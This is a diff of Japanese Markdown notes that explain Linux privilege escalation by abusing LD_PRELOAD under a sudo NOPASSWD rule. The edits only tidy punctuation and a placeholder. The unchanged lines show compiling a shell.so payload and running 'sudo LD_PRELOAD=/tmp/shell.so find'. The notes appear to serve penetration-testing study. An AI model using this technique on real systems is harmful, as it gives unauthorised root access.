@@ -378,8 +378,8 @@ Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(166
 ```zsh
 file <path_to_binary>
 ```
--  例: `ELF 64-bit LSB shared object, x86-64, ...` → ✅動的リンク（shared object）の可能性が高い。
-- 例: `statically linked` または `statically linked, stripped` → ❌静的リンク（LD_PRELOAD は効かない）。
+-  例: `ELF 64-bit LSB shared object, x86-64, ...` → ✅動的リンク（shared object）の可能性が高い
+- 例: `statically linked` または `statically linked, stripped` → ❌静的リンク（LD_PRELOAD は効かない）
 
 3. `sudo -l`の結果出力結果に`env_reset`があり、さらに`env_keep`に以下のいずれかがある
 
@@ -391,7 +391,7 @@ file <path_to_binary>
 
 ### LD_PRELOADの場合
 
-エクスプロイト技法ソース🔗：[LD_PRELOAD and NOPASSWD - PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd)
+エクスプロイト技法ソース：[LD_PRELOAD and NOPASSWD - PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd)
 
 1. ペイロードを用意（ファイル名は任意だが`shell.c`とする）
 ```c
@@ -412,7 +412,7 @@ void _init() {
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
 
-3. `sudo -l`の結果出力されたバイナリを`[program name`]に代入して実行
+3. `sudo -l`の結果出力されたバイナリを`<program_name>`に代入して実行
 ```zsh
 # 例：sudo LD_PRELOAD=/tmp/shell.so find
 sudo LD_PRELOAD=/tmp/shell.so <program_name>
